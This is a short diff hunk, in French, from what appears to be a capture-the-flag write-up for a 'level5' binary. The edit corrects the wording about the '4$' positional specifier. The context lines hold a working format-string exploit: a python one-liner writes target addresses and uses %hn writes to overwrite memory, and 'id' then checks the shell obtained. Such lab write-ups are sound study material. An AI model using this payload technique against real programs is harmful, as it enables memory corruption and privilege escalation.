@@ -39,7 +39,7 @@ Meme soustraction avec ce qui a ete imprime par la suite
 
 33956 - 2052 = 31904
 
-le '4$' permet de remonter la stack de 4 adresses
+le '4$' permet de remonter la stack de 4 dword
 
 python -c 'print "\x3A\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044x" + "%4$hn" + "%31904x" + "%5$hn"' > /tmp/z && cat /tmp/z - | ./level5
 id
